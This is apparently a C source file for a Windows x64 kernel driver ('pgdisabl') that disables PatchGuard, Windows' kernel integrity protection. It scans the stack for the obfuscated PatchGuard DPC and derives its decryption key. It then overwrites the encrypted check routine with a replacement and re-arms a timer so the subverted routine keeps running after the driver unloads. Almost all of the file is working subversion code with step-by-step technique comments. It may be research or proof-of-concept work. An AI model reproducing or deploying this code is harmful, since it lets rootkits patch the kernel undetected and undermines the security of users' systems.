#include <ntddk.h>
#include "pgdisabl.h"

#define PG_SIZE_OF_PATCHGUARD_ROUTINE 0x39 // 39 2c
#define PG_BASE_OF_ENVIRONMENT        0x40
#define PG_BASE_OF_STRING             0x70
#define PG_BASE_OF_TIMER              0xA0

#define PG_TIMER_TIME                 (-10000 * 1000 * 15) // 15 sec

PKDEFERRED_ROUTINE PgPatchGuardDpcRoutine;
PKDPC              PgPatchGuardDpc;

BOOLEAN
NTAPI
PgScanStackForObfuscatedDpc(
	__in PULONG64  Stack,
	__in ULONG     Shift,
	__in ULONG64   Hint,
	__in ULONG64   DeferredContext,
	__out PULONG64 Dpc
	)
{
	ULONG64 DpcTest;
	ULONG   i;
	BOOLEAN SkipHintTest = FALSE;

	KdPrint(("PGDISABL: Stack = %p, Shift = %x, Hint = %p, DeferredContext = %p.  Executing search...\n",
		Stack,
		Shift,
		Hint,
		DeferredContext));

	for (;;)
	{
		//
		// Our algorithm is as follows:
		//
		// We search upwards (in memory) from the stack frame of the routine that
		// called the DPC or timer.  We are looking for the obfuscated DPC pointer.
		//
		// The DPC routine obfuscates the pointer by rotating it right by the value
		// given in the "Shift" argument.  As a result, we'll need to rotate the
		// value left the equivalent amount in order to get the deobfuscated
		// pointer back.
		//
		// Also, for unknown reasons, the DPC routine stores a one-way hash of the
		// unobfuscated DPC pointer in r8.  This value is expressed as the "hint"
		// argument, and it is computed by shifting the DPC pointer right by the
		// low byte of the DeferredContext value.
		//
		// We can use this as a preliminary check to see if a suspected stack local
		// is a pointer to the PKDPC.
		//
		// If that check passes, then we also need to validate that we have a valid
		// pointer and that it appears to be a DPC pointer.  This is necessary to
		// cover the case where we might have shifted the hashed value in r8 over
		// 64 bits to zero.
		//
		// We'll then verify that the DPC appears to point to the expected DPC
		// routine and that the DeferredContext argument matches zero, and that the
		// Type matches zero.  These last two fields are intentionally zeroed out
		// by the DPC routine before the access violation is triggered.
		//
		// N.B. It is okay to search the stack as an array of ULONG64s, because the
		// stack is guaranteed to be aligned on at least a 16-byte boundary for
		// every call site on x64.  Also, the obfuscated PKDPC is a ULONG64 and
		// therefore naturally has pointer-sized alignment on the stack of the DPC
		// routine.  This does simplify the search quite a bit.
		//

		for (i = 0; 
			 i < 0x100 / sizeof(ULONG64);
			 i++)
		{
			//
			// Rotate this stack value over to undo the obfuscation.
			//

			DpcTest = _rotl64(Stack[ i ], Shift);

//			KdPrint(("PGDISABL: Testing stack slot %x (%p - %p)...\n",
//				i, &Stack[ i ], DpcTest));

			//
			// #1. Verify that the hashed DPC pointer value (Hint) matches the
			// value that we're about to test.
			//

			if (SkipHintTest || (DpcTest >> (UCHAR)DeferredContext == Hint))
			{
//				KdPrint(("PGDISABL: Stack slot %x (%p - %p) passed check 1.\n",
//					i, &Stack[ i ], DpcTest));

				//
				// #2. The KDPC object must be valid, and +40 through +48 must also
				// be valid, as that is where the decryption value for the function
				// pointer is stored relative to the KDPC object in the PatchGuard
				// context.
				//
				// (Yes, MmIsAddressValid is a hack and a race condition.  Well, we
				// are already way into dangerous land, anyway.  Don't do this in a
				// production driver that ever ends up on *my* box.)
				//

				if (MmIsAddressValid((PVOID)DpcTest) &&
					MmIsAddressValid((PVOID)(DpcTest + 0x48)))
				{
//					KdPrint(("PGDISABL: Stack slot %x (%p - %p) passed check 2.\n",
//						i, &Stack[ i ], DpcTest));

					//
					// #3. DpcTest->DeferredRoutine matches,
					// DpcTest->DeferredContext matches, DpcTest->Type matches.
					//

					if (((PKDPC)DpcTest)->DeferredRoutine == PgPatchGuardDpcRoutine && 
						((PKDPC)DpcTest)->DeferredContext == (PVOID)0               &&
						((PKDPC)DpcTest)->Type            == 0x00)
					{
						KdPrint(("PGDISABL: Detected PgPatchGuardDpc = %p\n",
							DpcTest));

						//
						// Gotcha!
						//

						*Dpc = (ULONG64)DpcTest;

						return TRUE;
					}
				}
			}
		}

		//
		// If we have not already tried the search without the "hint" check,
		// then do so now.  Otherwise we'll give up.
		//

		if (!SkipHintTest)
		{
			SkipHintTest = TRUE;
		}
		else
		{
			break;
		}
	}

	//
	// We failed to find it.  Bummer.
	//

	KdPrint(("PGDISABL: Failed to locate PgPatchGuardDpc.\n"));
	KdBreakPoint();

	return FALSE;
}

PULONG64
NTAPI
PgFindDpcCallerStack(
	__in PCONTEXT          ContextRecord,
	__in PEXCEPTION_RECORD ExceptionRecord,
	__in ULONG64           ImageBase,
	__in PRUNTIME_FUNCTION RuntimeFunction
	)
{
	return (PULONG64)ContextRecord->Rsp;
}

BOOLEAN
NTAPI
PgSubvertPatchGuard(
	__in PEXCEPTION_RECORD ExceptionRecord,
	__in ULONG64 EstablisherFrame,
	__inout PCONTEXT ContextRecord,
	__inout struct _DISPATCHER_CONTEXT* DispatcherContext,
	__in PRUNTIME_FUNCTION RuntimeFunction,
	__in ULONG64 ImageBase
	)
{
	ULONG64        Dpc, DeferredContext, DecryptionKey;
	UCHAR          Shift, Shift2;
	ULONG64        PatchGuardCheckFunction;
	PULONG64       DpcCallerStack, PatchGuardEnvironment;
	UNICODE_STRING ProcedureName;

	//
	// We need to recover the original arguments to the DPC at the time of the
	// exception.
	//

	RtlCopyMemory(
		&Shift,
		(PVOID)(ContextRecord->Rip - 1),
		1);

	//
	// All of the routines do a ROR Shift2 on the PKDPC, and thus we need to
	// ROL by the same amount to undo it.  To do this, we first need to find
	// the "Shift2" value.  This approach simply analyzes the ROR instruction
	// just before the faulting "mov eax, dword ptr [rax]" to cleanly
	// fingerprint each flavor of PatchGuard DPC routine.
	//

	switch (Shift)
	{

	case 0x1F: // CmpEnableLazyFlushDpcRoutine
		Shift2 = 0x27;
		break;

	case 0x26: // CmpLazyFlushDpcRoutine
		Shift2 = 0x32;
		break;

	case 0x34: // ExpTimeRefreshDpcRoutine
		Shift2 = 0x48;
		break;

	case 0x3B: // ExpTimeZoneDpcRoutine
		Shift2 = 0x53;
		break;

	case 0x42: // ExpCenturyDpcRoutine
		Shift2 = 0x5E;
		break;

	case 0x03: // ExpTimerDpcRoutine
		Shift2 = 0xFB;
		break;

	case 0x0A: // IopTimerDispatch
		Shift2 = 0x06;
		break;

	case 0x11: // IopIrpStackProfilerTimer
		Shift2 = 0x11;
		break;

	case 0x2D: // KiScanReadyQueues
		Shift2 = 0x3D;
		break;

	case 0x18: // PopThermalZoneDpc
		Shift2 = 0x18;
		break;

	default:
		KdPrint(("PGDISABL: Unknown shift 0x%02X.  Aborting subvert attempt.\n",
			Shift));

		return FALSE;

	}


	//
	// Derive the first instruction of the PatchGuard DPC from the unwind
	// metadata.
	//

	PgPatchGuardDpcRoutine = (PKDEFERRED_ROUTINE)(ImageBase + RuntimeFunction->BeginAddress);

	KdPrint(("PGDISABL: Detected PgPatchGuardDpcRoutine = %p\n",
		PgPatchGuardDpcRoutine));

	//
	// Grab the DPC caller's stack.
	//

	DpcCallerStack = PgFindDpcCallerStack(
		ContextRecord,
		ExceptionRecord,
		ImageBase,
		RuntimeFunction);

	//
	// Fetch the Deferred Context value.  It should be RAX.  This is the
	// encrypted function pointer that is encrypted by the decryption key that
	// is stored at Dpc+0x40.
	//

	DeferredContext = ContextRecord->Rax;

	//
	// Fish the DPC out of the stack.
	//

	if (!PgScanStackForObfuscatedDpc(
		DpcCallerStack,
		Shift2,
		ContextRecord->R8,
		DeferredContext,
		&Dpc))
	{
		KdPrint(("Failed to find DPC.\n"));
		KdBreakPoint();

		return FALSE;
	}

	//
	// The PatchGuard function encryption / decryption key is located at +0x40
	// bytes into the PKDPC that represents the PatchGuard timer.
	//

	DecryptionKey = *(PULONG64)(Dpc + 0x40);

	KdPrint(("PGDISABL: Detected Dpc = %p, DeferredContext = %p, DpcDecryptionShift = %x DecryptionKey = %p\n",
		Dpc,
		DeferredContext,
		Shift2,
		DecryptionKey));

	PatchGuardCheckFunction  = DecryptionKey ^ DeferredContext;
	PatchGuardCheckFunction |= 0xFFFFF80000000000;

	PgPatchGuardDpc = (PKDPC)Dpc;

	KdPrint(("PGDISABL: PatchGuardCheckFunction = %p\n",
		PatchGuardCheckFunction));

	RtlCopyMemory(
		(PVOID)PatchGuardCheckFunction,
		PgExampleReplacementRoutine,
		PG_SIZE_OF_PATCHGUARD_ROUTINE);

	//
	// Encrypt the start of the PatchGuard routine.
	//

	*(PULONG64)PatchGuardCheckFunction ^= DecryptionKey;

	//
	// Setup environmental data for our new PatchGuard routine.
	//
	// This includes function pointers and constants that we'll need and aren't
	// embedded in the actual assembler code for the PatchGuard routine itself.
	//

	PatchGuardEnvironment = (PULONG64)(PatchGuardCheckFunction + PG_BASE_OF_ENVIRONMENT);

	//
	// Resolve exports that the subverted PatchGuard routine needs.  We use
	// MmGetSystemRoutineAddress so the addresses point directly into nt and
	// not an IAT thunk residing in pgdisabl.sys.  This allows us to unload the
	// pgdisabl.sys driver image and allow the subverted PatchGuard to execute
	// completely stand-alone.
	//

	RtlInitUnicodeString(
		&ProcedureName,
		L"DbgPrint");

	// 40
	PatchGuardEnvironment[ 0x00 ] = (ULONG64)MmGetSystemRoutineAddress(
		&ProcedureName);

	RtlInitUnicodeString(
		&ProcedureName,
		L"KeSetTimer");

	// 48
	PatchGuardEnvironment[ 0x01 ] = (ULONG64)MmGetSystemRoutineAddress(
		&ProcedureName);

	PatchGuardEnvironment[ 0x02 ] = (ULONG64)Dpc;               // 50
	PatchGuardEnvironment[ 0x03 ] = (ULONG64)DeferredContext;   // 58

	// 60
	PatchGuardEnvironment[ 0x04 ] = (ULONG64)(PatchGuardCheckFunction + PG_BASE_OF_TIMER);
	PatchGuardEnvironment[ 0x05 ] = (ULONG64)(PG_TIMER_TIME);   // 68

	//
	// Initialize part of the PatchGuard context as a new timer for ourselves
	// to be periodically called through.
	//

	KeInitializeTimer(
		(PKTIMER)PatchGuardEnvironment[ 0x04 ]);

	strcpy(
		(PCHAR)(PatchGuardCheckFunction + PG_BASE_OF_STRING),
		"PGDISABL: Hello, world from PatchGuard!\n");

	KdPrint(("PGDISABL: PgExampleReplacementRoutine = %p (Size %x), Timer = %p\n",
		PgExampleReplacementRoutine, PG_SIZE_OF_PATCHGUARD_ROUTINE,
		PatchGuardEnvironment[ 0x04 ]));

	if (PgBreakOnPatchGuard)
	{
		KdBreakPoint();
	}

	return TRUE;
}
